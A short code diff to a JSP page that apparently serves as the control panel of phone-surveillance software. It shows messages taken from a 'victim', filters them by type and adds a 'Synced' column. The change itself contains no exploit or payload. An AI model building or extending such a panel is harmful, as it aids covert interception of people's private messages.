@@ -40,8 +40,9 @@
     <%
         try {
 
-            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
+            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 2, 2);
             final String victimCode = pathInfoUtils.getPart(1);
+            final String msgType = pathInfoUtils.getPart(2);
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
 
@@ -73,7 +74,7 @@
                         lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>
 
                 <%
-                    final List<Message> messages = Messages.getInstance().getAll(Messages.COLUMN_VICTIM_ID, theVictim.getId());
+                    final List<Message> messages = Messages.getInstance().getAll(theVictim.getId(), msgType);
                     if (messages != null) {
                 %>
                 <div class="row">
@@ -82,6 +83,7 @@
                             <th>From</th>
                             <th>Content</th>
                             <th>Delivered</th>
+                            <th>Synced</th>
                         </tr>
 
                         <%
@@ -90,7 +92,7 @@
                         <tr class="message_row">
 
                             <td>
-                                <%=CommonUtils.hyphenIfNull(message.getFromName()) + "-" + CommonUtils.hyphenIfNull(message.getFromPhone())%>
+                                <%=CommonUtils.emptyIfNull(message.getFromName()) + "-" + CommonUtils.hyphenIfNull(message.getFromPhone())%>
                             </td>
 
                             <td>
@@ -98,6 +100,9 @@
                             </td>
 
                             <td><%=message.getRelativeDeliveryTime()%>
+                            </td>
+
+                            <td><%=message.getRelativeSyncTime()%>
                             </td>
 
                         </tr>
